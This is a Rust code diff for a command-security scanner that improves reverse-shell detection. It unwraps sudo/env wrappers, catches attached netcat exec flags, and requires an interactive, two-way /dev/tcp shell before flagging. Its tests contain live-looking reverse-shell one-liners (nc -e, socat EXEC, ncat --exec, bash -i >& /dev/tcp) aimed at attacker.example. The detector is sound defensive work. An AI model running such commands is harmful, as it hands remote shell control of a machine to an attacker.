@@ -3013,6 +3013,86 @@ fn is_base64_decode_exec_body(joined_lower: &str) -> bool {
         || (joined_lower.contains("buffer.from") && joined_lower.contains("eval"))
 }
 
+/// Peel the supported wrapper grammar so command-specific checks inspect the
+/// actual executable and its argv, not the outer `sudo`/`env`/`command` layer.
+/// A bounded loop shares the global wrapper ceiling; unresolved over-depth
+/// chains remain owned by the existing `WrapperChainTooDeep` rule.
+fn effective_segment_through_wrappers(
+    seg: &tokenize::Segment,
+    shell: ShellType,
+) -> tokenize::Segment {
+    let mut effective = seg.clone();
+    for _ in 0..MAX_WRAPPER_DEPTH {
+        let Some(inner) = unwrap_one_wrapper_segment(&effective, shell) else {
+            break;
+        };
+        effective = inner;
+    }
+    effective
+}
+
+fn netcat_exec_argument(arg: &str, shell: ShellType) -> bool {
+    let normalized = normalize_shell_token(arg, shell);
+    matches!(normalized.as_str(), "-e" | "-c" | "--exec" | "--sh-exec")
+        || ["-e", "-c"].iter().any(|prefix| {
+            normalized
+                .strip_prefix(prefix)
+                .is_some_and(|v| !v.is_empty())
+        })
+        || ["--exec=", "--sh-exec="].iter().any(|prefix| {
+            normalized
+                .strip_prefix(prefix)
+                .is_some_and(|v| !v.is_empty())
+        })
+}
+
+/// `/dev/tcp` and `/dev/udp` are ordinary Bash connection primitives. They are
+/// a reverse shell only when a shell is explicitly interactive and its input
+/// and output are both wired to the network endpoint; a one-way health probe is
+/// not code execution.
+fn is_duplex_dev_net_shell(seg: &tokenize::Segment, shell: ShellType) -> bool {
+    if !seg.raw.contains("/dev/tcp/") && !seg.raw.contains("/dev/udp/") {
+        return false;
+    }
+    let effective = effective_segment_through_wrappers(seg, shell);
+    let base = effective
+        .command
+        .as_deref()
+        .map(|command| normalize_cmd_base(command, shell))
+        .unwrap_or_default();
+    if !matches!(base.as_str(), "bash" | "sh" | "dash" | "zsh" | "ksh") {
+        return false;
+    }
+    let normalized_args: Vec<String> = effective
+        .args
+        .iter()
+        .map(|arg| normalize_shell_token(arg, shell))
+        .collect();
+    let interactive = normalized_args.iter().any(|arg| {
+        arg == "-i"
+            || (arg.starts_with('-')
+                && !arg.starts_with("--")
+                && arg[1..].chars().any(|flag| flag == 'i'))
+    });
+    let raw = effective.raw.as_str();
+    let output_to_network = raw.contains(">& /dev/tcp/")
+        || raw.contains(">&/dev/tcp/")
+        || raw.contains(">& /dev/udp/")
+        || raw.contains(">&/dev/udp/")
+        || raw.contains("> /dev/tcp/")
+        || raw.contains(">/dev/tcp/")
+        || raw.contains("> /dev/udp/")
+        || raw.contains(">/dev/udp/");
+    let network_to_input = raw.contains("0>&1")
+        || raw.contains("0<&1")
+        || raw.contains("<& /dev/tcp/")
+        || raw.contains("<&/dev/tcp/")
+        || raw.contains("<& /dev/udp/")
+        || raw.contains("<&/dev/udp/");
+
+    interactive && output_to_network && network_to_input
+}
+
 /// Reverse/bind-shell shapes (PR3): a bash `/dev/tcp` | `/dev/udp` net redirect,
 /// `nc`/`ncat`/`netcat` with an exec-on-connect flag, or `socat … EXEC:`/`SYSTEM:`.
 /// Interpreter socket reverse shells go to
@@ -3024,27 +3104,26 @@ fn check_reverse_shell(
     findings: &mut Vec<Finding>,
 ) {
     for seg in segments {
-        // (a) bash /dev/tcp | /dev/udp network redirect — a literal, quoting-proof
-        //     marker used almost exclusively for back-connects.
-        let has_dev_net = seg.raw.contains("/dev/tcp/") || seg.raw.contains("/dev/udp/");
+        // (a) a shell whose standard input AND output are wired to /dev/tcp or
+        //     /dev/udp. A one-way connectivity probe is intentionally clean.
+        let has_dev_net_shell = is_duplex_dev_net_shell(seg, shell);
 
         // (b)/(c) tool-based shapes keyed on the resolved command base.
+        let effective = effective_segment_through_wrappers(seg, shell);
         let mut tool_shape: Option<&str> = None;
-        if let Some(ref cmd) = seg.command {
+        if let Some(ref cmd) = effective.command {
             match normalize_cmd_base(cmd, shell).as_str() {
                 "nc" | "ncat" | "netcat" => {
-                    let has_exec_flag = seg.args.iter().any(|a| {
-                        matches!(
-                            normalize_shell_token(a, shell).as_str(),
-                            "-e" | "-c" | "--exec" | "--sh-exec"
-                        )
-                    });
+                    let has_exec_flag = effective
+                        .args
+                        .iter()
+                        .any(|arg| netcat_exec_argument(arg, shell));
                     if has_exec_flag {
                         tool_shape = Some("netcat exec-on-connect");
                     }
                 }
                 "socat" => {
-                    let has_exec = seg.args.iter().any(|a| {
+                    let has_exec = effective.args.iter().any(|a| {
                         let up = normalize_shell_token(a, shell).to_uppercase();
                         up.contains("EXEC:") || up.contains("SYSTEM:")
                     });
@@ -3056,7 +3135,7 @@ fn check_reverse_shell(
             }
         }
 
-        let pattern = if has_dev_net {
+        let pattern = if has_dev_net_shell {
             Some("bash /dev/tcp redirect")
         } else {
             tool_shape
@@ -5775,6 +5854,52 @@ mod tests {
                 .any(|f| matches!(f.rule_id, RuleId::CurlPipeShell | RuleId::PipeToInterpreter)),
             "quoted cmd caret escapes should still detect the interpreter pipe"
         );
+    }
+
+    #[test]
+    fn reverse_shell_resolves_wrappers_and_attached_exec_arguments() {
+        for input in [
+            "env nc -e /bin/sh attacker.example 4444",
+            "sudo socat TCP:attacker.example:4444 EXEC:/bin/sh",
+            "command nc -e/bin/sh attacker.example 4444",
+            "nohup ncat --exec=/bin/bash attacker.example 4444",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::ReverseShell),
+                "wrapped or attached exec-on-connect must be detected: {input:?}; {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn dev_tcp_requires_interactive_duplex_shell() {
+        let reverse = check_default(
+            "bash -i >& /dev/tcp/attacker.example/4444 0>&1",
+            ShellType::Posix,
+        );
+        assert!(
+            reverse
+                .iter()
+                .any(|finding| finding.rule_id == RuleId::ReverseShell),
+            "interactive duplex shell must still be detected: {reverse:?}"
+        );
+
+        for probe in [
+            "bash -c 'echo > /dev/tcp/example.com/443'",
+            "printf ping > /dev/tcp/example.com/443",
+            "bash -i -c 'echo > /dev/tcp/example.com/443'",
+        ] {
+            let findings = check_default(probe, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::ReverseShell),
+                "one-way network probe is not a reverse shell: {probe:?}; {findings:?}"
+            );
+        }
     }
 
     #[test]
